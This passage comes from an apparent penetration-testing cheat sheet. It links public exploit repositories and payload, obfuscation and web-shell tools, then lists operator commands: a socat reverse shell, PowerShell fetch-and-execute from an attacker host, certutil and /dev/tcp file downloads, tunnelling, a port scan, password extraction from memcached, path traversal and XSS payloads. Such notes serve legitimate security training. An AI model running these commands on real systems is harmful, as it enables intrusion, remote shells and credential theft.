| CVE-2021-22204 | GitLab ExifTool RCE (Python Implementation) | https://github.com/convisolabs/CVE-2021-22204-exiftool |
| CVE-2021-26085 | Confluence Server RCE | https://github.com/Phuong39/CVE-2021-26085 |
| CVE-2021-27928 | MariaDB/MySQL wsrep provider RCE | https://github.com/Al1ex/CVE-2021-27928 |
| CVE-2021-3129 | Laravel Framework RCE | https://github.com/nth347/CVE-2021-3129_exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE  | https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit |
| CVE-2021-3156 | Sudo / sudoedit LPE PoC | https://github.com/blasty/CVE-2021-3156 |
| CVE-2021-3493 | OverlayFS Ubuntu Kernel Exploit LPE | https://github.com/briskets/CVE-2021-3493 |
| CVE-2021-3560 | polkit LPE (C Implementation) | https://github.com/hakivvi/CVE-2021-3560 |
| CVE-2021-3560 | polkit LPE | https://github.com/Almorabea/Polkit-exploit |
| CVE-2021-3560 | polkit LPE PoC | https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation |
| CVE-2021-36934 | HiveNightmare LPE | https://github.com/GossiTheDog/HiveNightmare |
| CVE-2021-36942 | PetitPotam | https://github.com/topotam/PetitPotam |
| CVE-2021-36942 | DFSCoerce | https://github.com/Wh04m1001/DFSCoerce |
| CVE-2021-4034 | PwnKit Pkexec Self-contained Exploit LPE | https://github.com/ly4k/PwnKit |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (1) | https://github.com/dzonerzy/poc-cve-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (2) | https://github.com/arthepsy/CVE-2021-4034 |
| CVE-2021-4034 | PwnKit Pkexec LPE PoC (3) | https://github.com/nikaiw/CVE-2021-4034 |
| CVE-2021-40444 | MSHTML builders RCE | https://github.com/aslitsecurity/CVE-2021-40444_builders |
| CVE-2021-40444 | MSHTML Exploit RCE | https://xret2pwn.github.io/CVE-2021-40444-Analysis-and-Exploit/ |
| CVE-2021-40444 | MSHTML RCE PoC | https://github.com/lockedbyte/CVE-2021-40444 |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Archive) | https://github.com/klinix5/InstallerFileTakeOver |
| CVE-2021-41379 | InstallerFileTakeOver LPE (0-day) (Fork) | https://github.com/waltlin/CVE-2021-41379-With-Public-Exploit-Lets-You-Become-An-Admin-InstallerFileTakeOver |
| CVE-2021-41773,CVE-2021-42013, CVE-2020-17519 | Simples Apache Path Traversal (0-day) | https://github.com/MrCl0wnLab/SimplesApachePathTraversal |
| CVE-2021-42278,CVE-2021-42287 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE | https://github.com/WazeHell/sam-the-admin |
| CVE-2021-42278 | sam-the-admin, sAMAccountName Spoofing / Domain Admin Impersonation PE (Python Implementation) | https://github.com/ly4k/Pachine |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (1) | https://github.com/cube0x0/noPac |
| CVE-2021-42287,CVE-2021-42278 | noPac LPE (2) | https://github.com/Ridter/noPac |
| CVE-2021-42321 | Microsoft Exchange Server RCE | https://gist.github.com/testanull/0188c1ae847f37a70fe536123d14f398 |
| CVE-2021-44228 | Log4Shell RCE (0-day) | https://github.com/kozmer/log4j-shell-poc |
| CVE-2022-0847 | DirtyPipe-Exploits LPE | https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits |
| CVE-2022-21999 | SpoolFool, Windows Print Spooler LPE | https://github.com/ly4k/SpoolFool |
| CVE-2022-22963 | Spring4Shell RCE (0-day) | https://github.com/tweedge/springcore-0day-en |
| CVE-2022-23119,CVE-2022-23120 | Trend Micro Deep Security Agent for Linux Arbitrary File Read | https://github.com/modzero/MZ-21-02-Trendmicro |
| CVE-2022-24715 | Icinga Web 2 Authenticated Remote Code Execution RCE | https://github.com/JacobEbben/CVE-2022-24715 |
| CVE-2022-26134 | ConfluentPwn RCE (0-day) | https://github.com/redhuntlabs/ConfluentPwn |
| CVE-2022-30190 | MS-MSDT Follina Attack Vector RCE | https://github.com/JohnHammond/msdt-follina |
| CVE-2022-30190 | MS-MSDT Follina RCE PoC | https://github.com/onecloudemoji/CVE-2022-30190 |
| CVE-2022-30190 | MS-MSDT Follina RCE (Python Implementation) | https://github.com/chvancooten/follina.py |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://seclists.org/oss-sec/2022/q2/188 |
| CVE-2022-31214 | Firejail / Firejoin LPE | https://www.openwall.com/lists/oss-security/2022/06/08/10 |
| CVE-2022-34918 | Netfilter Kernel Exploit LPE | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
| CVE-2022-46169 | Cacti Authentication Bypass RCE | https://github.com/ariyaadinatha/cacti-cve-2022-46169-exploit |
| CVE-2023-21716 | CVE-2023-21716: Microsoft Word RTF Font Table Heap Corruption RCE PoC (Python Implementation) | https://github.com/Xnuvers007/CVE-2023-21716 |
| CVE-2023-21746 | Windows NTLM EoP LocalPotato LPE | https://github.com/decoder-it/LocalPotato |
| CVE-2023-21768 | Windows Ancillary Function Driver for WinSock LPE POC | https://github.com/chompie1337/Windows_LPE_AFD_CVE-2023-21768 |
| CVE-2023-21817 | Kerberos Unlock LPE PoC | https://gist.github.com/monoxgas/f615514fb51ebb55a7229f3cf79cf95b |
| CVE-2023-22809 | sudoedit LPE | https://github.com/n3m1dotsys/CVE-2023-22809-sudoedit-privesc |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) | https://github.com/sqrtZeroKnowledge/CVE-2023-23397_EXPLOIT_0DAY |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) (PowerShell Implementation) | https://github.com/api0cradle/CVE-2023-23397-POC-Powershell |
| CVE-2023-23397 | Microsoft Outlook (Click-to-Run) PE (0-day) (Python Implementation) | https://github.com/Trackflaw/CVE-2023-23397 |
| CVE-2023-25690 | Apache mod_proxy HTTP Request Smuggling PoC | https://github.com/dhmosfunk/CVE-2023-25690-POC |
| CVE-2023-28879 | Shell in the Ghost: Ghostscript RCE PoC | https://github.com/AlmondOffSec/PoCs/tree/master/Ghostscript_rce |
| CVE-2023-32233 | Use-After-Free in Netfilter nf_tables LPE | https://github.com/Liuk3r/CVE-2023-32233 |
| CVE-2023-32629, CVE-2023-2640 | GameOverlay Ubuntu Kernel Exploit LPE (0-day) | https://twitter.com/liadeliyahu/status/1684841527959273472?s=09 |
| CVE-2023-36874 | Windows Error Reporting Service LPE (0-day) | https://github.com/Wh04m1001/CVE-2023-36874 |
| n/a | dompdf RCE (0-day) | https://github.com/positive-security/dompdf-rce |
| n/a | dompdf XSS to RCE (0-day) | https://positive.security/blog/dompdf-rce |
| n/a | StorSvc LPE | https://github.com/blackarrowsec/redteam-research/tree/master/LPE%20via%20StorSvc |
| n/a | DCOMPotato LPE | https://github.com/zcgonvh/DCOMPotato |
| n/a | GenericPotato LPE | https://github.com/micahvandeusen/GenericPotato |
| n/a | GodPotato LPE | https://github.com/BeichenDream/GodPotato |
| n/a | JuicyPotato LPE | https://github.com/ohpe/juicy-potato |
| n/a | Juice-PotatoNG LPE | https://github.com/antonioCoco/JuicyPotatoNG |
| n/a | MultiPotato LPE | https://github.com/S3cur3Th1sSh1t/MultiPotato |
| n/a | RemotePotato0 PE | https://github.com/antonioCoco/RemotePotato0 |
| n/a | RoguePotato LPE | https://github.com/antonioCoco/RoguePotato |
| n/a | RottenPotatoNG LPE | https://github.com/breenmachine/RottenPotatoNG |
| n/a | SharpEfsPotato LPE | https://github.com/bugch3ck/SharpEfsPotato |
| n/a | SweetPotato LPE | https://github.com/CCob/SweetPotato |
| n/a | SweetPotato LPE | https://github.com/uknowsec/SweetPotato |
| n/a | S4UTomato LPE | https://github.com/wh0amitz/S4UTomato |
| n/a | PrintSpoofer LPE (1) | https://github.com/dievus/printspoofer |
| n/a | PrintSpoofer LPE (2) | https://github.com/itm4n/PrintSpoofer |
| n/a | Shocker Container Escape | https://github.com/gabrtv/shocker |
| n/a | SystemNightmare PE | https://github.com/GossiTheDog/SystemNightmare |
| n/a | NoFilter LPE | https://github.com/deepinstinct/NoFilter |
| n/a | OfflineSAM LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM |
| n/a | OfflineAddAdmin2 LPE | https://github.com/gtworek/PSBits/tree/master/OfflineSAM/OfflineAddAdmin2 |
| n/a | Kernelhub | https://github.com/Ascotbe/Kernelhub |
| n/a | Windows Exploits | https://github.com/SecWiki/windows-kernel-exploits |
| n/a | Pre-compiled Windows Exploits | https://github.com/abatchy17/WindowsExploits |</p>
<h3>Payloads</h3>
<p>| Name | URL |
| --- | --- |
| AMSI.fail | http://amsi.fail |
| Donut | https://github.com/TheWover/donut |
| Freeze | https://github.com/optiv/Freeze |
| hoaxshell | https://github.com/t3l3machus/hoaxshell |
| Invoke-Obfuscation | https://github.com/danielbohannon/Invoke-Obfuscation |
| marshalsec | https://github.com/mbechler/marshalsec |
| nishang | https://github.com/samratashok/nishang |
| Payload Box | https://github.com/payloadbox |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| phpgcc | https://github.com/ambionics/phpggc |
| PHP-Reverse-Shell | https://github.com/ivan-sincek/php-reverse-shell|
| PowerLine | https://github.com/fullmetalcache/powerline |
| PowerShell Encoder (CyberChef) | <a href="https://cyberchef.io/#recipe=Encode_text('UTF-16LE%20(1200)')To_Base64('A-Za-z0-9%2B/%3D')">Receipe for encoding PowerShell Payloads for Windows</a> |
| Raikia's Hub Powershell Encoder | https://raikia.com/tool-powershell-encoder/ |
| ScareCrow | https://github.com/optiv/ScareCrow |
| Shikata Ga Nai | https://github.com/EgeBalci/sgn |
| unicorn | https://github.com/trustedsec/unicorn |
| Veil | https://github.com/Veil-Framework/Veil |
| webshell | https://github.com/tennc/webshell |
| Web-Shells | https://github.com/TheBinitGhimire/Web-Shells |
| woodpecker | https://github.com/woodpecker-appstore/log4j-payload-generator |
| ysoserial | https://github.com/frohoff/ysoserial |
| ysoserial.net | https://github.com/pwntester/ysoserial.net |</p>
<h3>Wordlists</h3>
<p>| Name | URL |
| --- | --- |
| bopscrk | https://github.com/R3nt0n/bopscrk |
| CeWL | https://github.com/digininja/cewl |
| COOK | https://github.com/giteshnxtlvl/cook |
| CUPP | https://github.com/Mebus/cupp |
| Kerberos Username Enumeration | https://github.com/attackdebris/kerberos_enum_userlists |
| SecLists | https://github.com/danielmiessler/SecLists |</p>
<h3>Social Media Resources</h3>
<p>| Name | URL |
| --- | --- |
| IppSec (YouTube) | https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA |
| IppSec.rocks | https://ippsec.rocks/?# |
| 0xdf | https://0xdf.gitlab.io/
| HackTricks | https://book.hacktricks.xyz/ |
| Hacking Articles | https://www.hackingarticles.in/ |
| Rana Khalil | https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/ |</p>
<h2>Commands</h2>
<h3>Basics</h3>
<h4>curl</h4>
<pre><code class="language-c">curl -v http://&lt;DOMAIN&gt;                                                        // verbose output
curl -X POST http://&lt;DOMAIN&gt;                                                   // use POST method
curl -X PUT http://&lt;DOMAIN&gt;                                                    // use PUT method
curl --path-as-is http://&lt;DOMAIN&gt;/../../../../../../etc/passwd                 // use --path-as-is to handle /../ or /./ in the given URL
curl --proxy http://127.0.0.1:8080                                             // use proxy
curl -F myFile=@&lt;FILE&gt; http://&lt;RHOST&gt;                                          // file upload
curl${IFS}&lt;LHOST&gt;/&lt;FILE&gt;                                                       // Internal Field Separator (IFS) example
</code></pre>
<h4>Chisel</h4>
<h5>Reverse Pivot</h5>
<pre><code class="language-c">./chisel server -p 9002 -reverse -v
./chisel client &lt;LHOST&gt;:9002 R:3000:127.0.0.1:3000
</code></pre>
<h5>SOCKS5 / Proxychains Configuration</h5>
<pre><code class="language-c">./chisel server -p 9002 -reverse -v
./chisel client &lt;LHOST&gt;:9002 R:socks
</code></pre>
<h4>File Transfer</h4>
<h5>Certutil</h5>
<pre><code class="language-c">certutil -urlcache -split -f &quot;http://&lt;LHOST&gt;/&lt;FILE&gt;&quot; &lt;FILE&gt;
</code></pre>
<h5>Netcat</h5>
<pre><code class="language-c">nc -lnvp &lt;LPORT&gt; &lt; &lt;FILE&gt;
nc &lt;RHOST&gt; &lt;RPORT&gt; &gt; &lt;FILE&gt;
</code></pre>
<h5>Impacket</h5>
<pre><code class="language-c">sudo impacket-smbserver &lt;SHARE&gt; ./
sudo impacket-smbserver &lt;SHARE&gt; . -smb2support
copy * \\&lt;LHOST&gt;\&lt;SHARE&gt;
</code></pre>
<h5>PowerShell</h5>
<pre><code class="language-c">iwr &lt;LHOST&gt;/&lt;FILE&gt; -o &lt;FILE&gt;
IEX(IWR http://&lt;LHOST&gt;/&lt;FILE&gt;) -UseBasicParsing
powershell -command Invoke-WebRequest -Uri http://&lt;LHOST&gt;:&lt;LPORT&gt;/&lt;FILE&gt; -Outfile C:\\temp\\&lt;FILE&gt;
</code></pre>
<h5>Bash only</h5>
<h6>wget version</h6>
<p>Paste directly to the shell.</p>
<pre><code class="language-c">function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag=&quot;Connection: close&quot;
    local mark=0

    if [ -z &quot;${URL}&quot; ]; then
        printf &quot;Usage: %s \&quot;URL\&quot; [e.g.: %s http://www.google.com/]&quot; \
               &quot;${FUNCNAME[0]}&quot; &quot;${FUNCNAME[0]}&quot;
        return 1;
    fi
    read proto server path &lt;&lt;&lt;$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x&quot;${HOST}&quot; == x&quot;${PORT}&quot; ]] &amp;&amp; PORT=80
    [[ $DEBUG -eq 1 ]] &amp;&amp; echo &quot;HOST=$HOST&quot;
    [[ $DEBUG -eq 1 ]] &amp;&amp; echo &quot;PORT=$PORT&quot;
    [[ $DEBUG -eq 1 ]] &amp;&amp; echo &quot;DOC =$DOC&quot;

    exec 3&lt;&gt;/dev/tcp/${HOST}/$PORT
    echo -en &quot;GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n&quot; &gt;&amp;3
    while read line; do
        [[ $mark -eq 1 ]] &amp;&amp; echo $line
        if [[ &quot;${line}&quot; =~ &quot;${tag}&quot; ]]; then
            mark=1
        fi
    done &lt;&amp;3
    exec 3&gt;&amp;-
}
</code></pre>
<pre><code class="language-c">__wget http://&lt;LHOST&gt;/&lt;FILE&gt;
</code></pre>
<h6>curl version</h6>
<pre><code class="language-c">function __curl() {
  read proto server path &lt;&lt;&lt;$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x&quot;${HOST}&quot; == x&quot;${PORT}&quot; ]] &amp;&amp; PORT=80

  exec 3&lt;&gt;/dev/tcp/${HOST}/$PORT
  echo -en &quot;GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n&quot; &gt;&amp;3
  (while read line; do
   [[ &quot;$line&quot; == $'\r' ]] &amp;&amp; break
  done &amp;&amp; cat) &lt;&amp;3
  exec 3&gt;&amp;-
}
</code></pre>
<pre><code class="language-c">__curl http://&lt;LHOST&gt;/&lt;FILE&gt; &gt; &lt;OUTPUT_FILE&gt;
</code></pre>
<h4>FTP</h4>
<pre><code class="language-c">ftp &lt;RHOST&gt;
wget -r ftp://anonymous:anonymous@&lt;RHOST&gt;
</code></pre>
<h4>Kerberos</h4>
<pre><code class="language-c">sudo apt-get install krb5-kdc
</code></pre>
<pre><code class="language-c">impacket-getTGT &lt;DOMAIN&gt;/&lt;USERNAME&gt;:'&lt;PASSWORD&gt;'
export KRB5CCNAME=&lt;FILE&gt;.ccache
export KRB5CCNAME='realpath &lt;FILE&gt;.ccache'
</code></pre>
<pre><code class="language-c">/etc/krb5.conf                   // kerberos configuration file location
kinit &lt;USERNAME&gt;                 // creating ticket request
klist                            // show available kerberos tickets
kdestroy                         // delete cached kerberos tickets
.k5login                         // resides kerberos principals for login (place in home directory)
krb5.keytab                      // &quot;key table&quot; file for one or more principals
kadmin                           // kerberos administration console
add_principal &lt;EMAIL&gt;            // add a new user to a keytab file
ksu                              // executes a command with kerberos authentication
klist -k /etc/krb5.keytab        // lists keytab file
kadmin -p kadmin/&lt;EMAIL&gt; -k -t /etc/krb5.keytab    // enables editing of the keytab file
</code></pre>
<h4>Ligolo-ng</h4>
<blockquote>
<p>https://github.com/nicocha30/ligolo-ng</p>
</blockquote>
<h5>Download Proxy and Agent</h5>
<pre><code class="language-c">wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
</code></pre>
<h5>Prepare Tunnel Interface</h5>
<pre><code class="language-c">sudo ip tuntap add user $(whoami) mode tun ligolo
</code></pre>
<pre><code class="language-c">sudo ip link set ligolo up
</code></pre>
<h5>Setup Proxy on Attacker Machine</h5>
<pre><code class="language-c">./proxy -laddr &lt;LHOST&gt;:443 -selfcert
</code></pre>
<h5>Setup Agent on Target Machine</h5>
<pre><code class="language-c">./agent -connect &lt;LHOST&gt;:443 -ignore-cert
</code></pre>
<h5>Session</h5>
<pre><code class="language-c">ligolo-ng » session
</code></pre>
<pre><code class="language-c">[Agent : user@target] » ifconfig
</code></pre>
<pre><code class="language-c">sudo ip r add 172.16.1.0/24 dev ligolo
</code></pre>
<pre><code class="language-c">[Agent : user@target] » start
</code></pre>
<h4>Linux</h4>
<h5>CentOS</h5>
<pre><code class="language-c">doas -u &lt;USERNAME&gt; /bin/sh
</code></pre>
<h5>Environment Variables</h5>
<pre><code class="language-c">export PATH=`pwd`:$PATH
</code></pre>
<h5>gcc</h5>
<pre><code class="language-c">gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
i686-w64-mingw32-gcc -o main32.exe main.c
x86_64-w64-mingw32-gcc -o main64.exe main.c
</code></pre>
<h5>getfacl</h5>
<pre><code class="language-c">getfacl &lt;LOCAL_DIRECTORY&gt;
</code></pre>
<h5>iconv</h5>
<pre><code class="language-c">echo &quot;&lt;COMMAND&gt;&quot; | iconv -t UTF-16LE | base64 -w 0
echo &quot;&lt;COMMAND&gt;&quot; | iconv -f UTF-8 -t UTF-16LE | base64 -w0
iconv -f ASCII -t UTF-16LE &lt;FILE&gt;.txt | base64 | tr -d &quot;\n&quot;
</code></pre>
<h5>vi</h5>
<pre><code class="language-c">:w !sudo tee %    # save file with elevated privileges without exiting
</code></pre>
<h5>Windows Command Formatting</h5>
<pre><code class="language-c">echo &quot;&lt;COMMAND&gt;&quot; | iconv -f UTF-8 -t UTF-16LE | base64 -w0
</code></pre>
<h4>Microsoft Windows</h4>
<h5>dir</h5>
<pre><code class="language-c">dir flag* /s /p
dir /s /b *.log
</code></pre>
<h4>PHP Webserver</h4>
<pre><code class="language-c">sudo php -S 127.0.0.1:80
</code></pre>
<h4>Ping</h4>
<pre><code class="language-c">ping -c 1 &lt;RHOST&gt;
ping -n 1 &lt;RHOST&gt;
</code></pre>
<h4>Python Webserver</h4>
<pre><code class="language-c">sudo python -m SimpleHTTPServer 80
sudo python3 -m http.server 80
</code></pre>
<h4>RDP</h4>
<pre><code class="language-c">xfreerdp /v:&lt;RHOST&gt; /u:&lt;USERNAME&gt; /p:&lt;PASSWORD&gt; /dynamic-resolution +clipboard
xfreerdp /v:&lt;RHOST&gt; /u:&lt;USERNAME&gt; /d:&lt;DOMAIN&gt; /pth:'&lt;HASH&gt;' /dynamic-resolution +clipboard
rdesktop &lt;RHOST&gt;
</code></pre>
<h4>showmount</h4>
<pre><code class="language-c">/usr/sbin/showmount -e &lt;RHOST&gt;
sudo showmount -e &lt;RHOST&gt;
chown root:root sid-shell; chmod +s sid-shell
</code></pre>
<h4>smbclient</h4>
<pre><code class="language-c">smbclient -L \\&lt;RHOST&gt;\ -N
smbclient -L //&lt;RHOST&gt;/ -N
smbclient -L ////&lt;RHOST&gt;/ -N
smbclient -U &quot;&lt;USERNAME&gt;&quot; -L \\\\&lt;RHOST&gt;\\
smbclient -L //&lt;RHOST&gt;// -U &lt;USERNAME&gt;%&lt;PASSWORD&gt;
smbclient //&lt;RHOST&gt;/SYSVOL -U &lt;USERNAME&gt;%&lt;PASSWORD&gt;
smbclient &quot;\\\\&lt;RHOST&gt;\&lt;SHARE&gt;&quot;
smbclient \\\\&lt;RHOST&gt;\\&lt;SHARE&gt; -U '&lt;USERNAME&gt;' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
smbclient --no-pass //&lt;RHOST&gt;/&lt;SHARE&gt;
mount.cifs //&lt;RHOST&gt;/&lt;SHARE&gt; /mnt/remote
guestmount --add '/&lt;MOUNTPOINT&gt;/&lt;DIRECTORY/FILE&gt;' --inspector --ro /mnt/&lt;MOUNT&gt; -v
</code></pre>
<h5>Download multiple files at once</h5>
<pre><code class="language-c">mask&quot;&quot;
recurse ON
prompt OFF
mget *
</code></pre>
<h5>Upload multiple Files at once</h5>
<pre><code class="language-c">recurse ON
prompt OFF
mput *
</code></pre>
<h4>socat</h4>
<pre><code class="language-c">socat TCP-LISTEN:&lt;LPORT&gt;,fork TCP:&lt;RHOST&gt;:&lt;RPORT&gt;
</code></pre>
<pre><code class="language-c">socat file:`tty`,raw,echo=0 tcp-listen:&lt;LPORT&gt;
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:&lt;LHOST&gt;:&lt;LPORT&gt;
</code></pre>
<pre><code class="language-c">socat tcp-listen:5986,reuseaddr,fork tcp:&lt;RHOST&gt;:9002
socat tcp-listen:9002,reuseaddr,fork tcp:192.168.122.228:5968 &amp;
</code></pre>
<h4>SSH</h4>
<pre><code class="language-c">ssh user@&lt;RHOST&gt; -oKexAlgorithms=+diffie-hellman-group1-sha1

ssh -R 8080:&lt;LHOST&gt;:80 &lt;RHOST&gt;
ssh -L 8000:127.0.0.1:8000 &lt;USERNAME&gt;@&lt;RHOST&gt;
ssh -N -L 1234:127.0.0.1:1234 &lt;USERNAME&gt;@&lt;RHOST&gt;

ssh -L 80:&lt;LHOST&gt;:80 &lt;RHOST&gt;
ssh -L 127.0.0.1:80:&lt;LHOST&gt;:80 &lt;RHOST&gt;
ssh -L 80:localhost:80 &lt;RHOST&gt;
</code></pre>
<h4>Time and Date</h4>
<h5>Get the Server Time</h5>
<pre><code class="language-c">sudo nmap -sU -p 123 --script ntp-info &lt;RHOST&gt;
</code></pre>
<h5>Stop virtualbox-guest-utils to stop syncing Time</h5>
<pre><code class="language-c">sudo /etc/init.d/virtualbox-guest-utils stop
</code></pre>
<h5>Stop systemd-timesyncd to sync Time manually</h5>
<pre><code class="language-c">sudo systemctl stop systemd-timesyncd
</code></pre>
<h5>Disable automatic Sync</h5>
<pre><code class="language-c">sudo systemctl disable --now chronyd
</code></pre>
<h5>Options to set the Date and Time</h5>
<pre><code class="language-c">sudo net time -c &lt;RHOST&gt;
sudo net time set -S &lt;RHOST&gt;
sudo net time \\&lt;RHOST&gt; /set /y
sudo ntpdate &lt;RHOST&gt;
sudo ntpdate -s &lt;RHOST&gt;
sudo ntpdate -b -u &lt;RHOST&gt;
sudo timedatectl set-timezone UTC
sudo timedatectl list-timezones
sudo timedatectl set-timezone '&lt;COUNTRY&gt;/&lt;CITY&gt;'
sudo timedatectl set-time 15:58:30
sudo timedatectl set-time '2015-11-20 16:14:50'
sudo timedatectl set-local-rtc 1
</code></pre>
<h5>Keep in Sync with a Server</h5>
<pre><code class="language-c">while [ 1 ]; do sudo ntpdate &lt;RHOST&gt;;done
</code></pre>
<h4>Tmux</h4>
<pre><code class="language-c">ctrl b + w    # show windows
ctrl + &quot;      # split window horizontal
ctrl + %      # split window vertical
ctrl + ,      # rename window
ctrl + {      # flip window
ctrl + }      # flip window
ctrl + spacebar    # switch pane layout
</code></pre>
<p>Copy &amp; Paste</p>
<pre><code class="language-c">:setw -g mode-keys vi
ctrl b + [
space
enter
ctrl b + ]
</code></pre>
<p>Search</p>
<pre><code class="language-c">ctrl b + [    # enter copy
ctrl + /      # enter search while within copy mode for vi mode
n             # search next
shift + n     # reverse search
</code></pre>
<p>Logging</p>
<pre><code class="language-c">ctrl b
shift + P    # start / stop
</code></pre>
<p>Save Output</p>
<pre><code class="language-c">ctrl b + :
capture-pane -S -
ctrl b + :
save-buffer &lt;FILE&gt;.txt
</code></pre>
<h4>Upgrading Shells</h4>
<pre><code class="language-c">python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'
python3 -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'

ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
</code></pre>
<p>Alternatively:</p>
<pre><code class="language-c">script -q /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null
</code></pre>
<h3>Oneliner</h3>
<pre><code class="language-c">stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
</code></pre>
<h4>Fixing Staircase Effect</h4>
<pre><code class="language-c">env reset
</code></pre>
<p>or</p>
<pre><code class="language-c">stty onlcr
</code></pre>
<h4>VirtualBox</h4>
<pre><code class="language-c">sudo pkill VBoxClient &amp;&amp; VBoxClient --clipboard
</code></pre>
<h4>virtualenv</h4>
<pre><code class="language-c">sudo apt-get install virtualenv
virtualenv -p python2.7 venv
. venv/bin/activate
</code></pre>
<pre><code class="language-c">python.exe -m pip install virtualenv
python.exe -m virtualenv venv
venv\Scripts\activate
</code></pre>
<h3>Information Gathering</h3>
<h4>memcached</h4>
<blockquote>
<p>https://github.com/pd4d10/memcached-cli</p>
</blockquote>
<pre><code class="language-c">memcrashed / 11211/UDP

npm install -g memcached-cli
memcached-cli &lt;USERNAME&gt;:&lt;PASSWORD&gt;@&lt;RHOST&gt;:11211
echo -en &quot;\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n&quot; | nc -q1 -u 127.0.0.1 11211

STAT pid 21357
STAT uptime 41557034
STAT time 1519734962

sudo nmap &lt;RHOST&gt; -p 11211 -sU -sS --script memcached-info

stats items
stats cachedump 1 0
get link
get file
get user
get passwd
get account
get username
get password
</code></pre>
<h4>NetBIOS</h4>
<pre><code class="language-c">nbtscan &lt;RHOST&gt;
nmblookup -A &lt;RHOST&gt;
</code></pre>
<h4>Nmap</h4>
<pre><code class="language-c">sudo nmap -A -T4 -sC -sV -p- &lt;RHOST&gt;
sudo nmap -sV -sU &lt;RHOST&gt;
sudo nmap -A -T4 -sC -sV --script vuln &lt;RHOST&gt;
sudo nmap -A -T4 -p- -sS -sV -oN initial --script discovery &lt;RHOST&gt;
sudo nmap -sC -sV -p- --scan-delay 5s &lt;RHOST&gt;
sudo nmap $TARGET -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' &lt;RHOST&gt;
ls -lh /usr/share/nmap/scripts/*ssh*
locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|version\|safe' | grep smb
</code></pre>
<h4>Port Scanning</h4>
<pre><code class="language-c">for p in {1..65535}; do nc -vn &lt;RHOST&gt; $p -w 1 -z &amp; done 2&gt; &lt;FILE&gt;.txt
</code></pre>
<pre><code class="language-c">export ip=&lt;RHOST&gt;; for port in $(seq 1 65535); do timeout 0.01 bash -c &quot;&lt;/dev/tcp/$ip/$port &amp;&amp; echo The port $port is open || echo The Port $port is closed &gt; /dev/null&quot; 2&gt;/dev/null || echo Connection Timeout &gt; /dev/null; done
</code></pre>
<h4>snmpwalk</h4>
<pre><code class="language-c">snmpwalk -c public -v1 &lt;RHOST&gt;
snmpwalk -v2c -c public &lt;RHOST&gt; 1.3.6.1.2.1.4.34.1.3
snmpwalk -v2c -c public &lt;RHOST&gt; .1
snmpwalk -v2c -c public &lt;RHOST&gt; nsExtendObjects
snmpwalk -c public -v1 &lt;RHOST&gt; 1.3.6.1.4.1.77.1.2.25
snmpwalk -c public -v1 &lt;RHOST&gt; 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 &lt;RHOST&gt; .1.3.6.1.2.1.1.5
snmpwalk -c public -v1 &lt;RHOST&gt; 1.3.6.1.4.1.77.1.2.3.1.1
snmpwalk -c public -v1 &lt;RHOST&gt; 1.3.6.1.4.1.77.1.2.27
snmpwalk -c public -v1 &lt;RHOST&gt; 1.3.6.1.2.1.6.13.1.3
snmpwalk -c public -v1 &lt;RHOST&gt; 1.3.6.1.2.1.25.6.3.1.2
</code></pre>
<h3>Web Application Analysis</h3>
<h4>Burp Suite</h4>
<pre><code class="language-c">Ctrl+r          // Sending request to repeater
Ctrl+i          // Sending request to intruder
Ctrl+Shift+b    // base64 encoding
Ctrl+Shift+u    // URL decoding
</code></pre>
<h4>Set Proxy Environment Variables</h4>
<pre><code class="language-c">export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=https://localhost:8080
</code></pre>
<h4>cadaver</h4>
<pre><code class="language-c">cadaver http://&lt;RHOST&gt;/&lt;WEBDAV_DIRECTORY&gt;/
</code></pre>
<pre><code class="language-c">dav:/&lt;WEBDAV_DIRECTORY&gt;/&gt; cd C
dav:/&lt;WEBDAV_DIRECTORY&gt;/C/&gt; ls
dav:/&lt;WEBDAV_DIRECTORY&gt;/C/&gt; put &lt;FILE&gt;
</code></pre>
<h4>Cross-Site Scripting (XSS)</h4>
<pre><code class="language-c">&lt;sCrIpt&gt;alert(1)&lt;/ScRipt&gt;
&lt;script&gt;alert('XSS');&lt;/script&gt;
&lt;script&gt;alert(document.cookies)&lt;/script&gt;
&lt;script&gt;document.querySelector('#foobar-title').textContent = '&lt;TEXT&gt;'&lt;/script&gt;
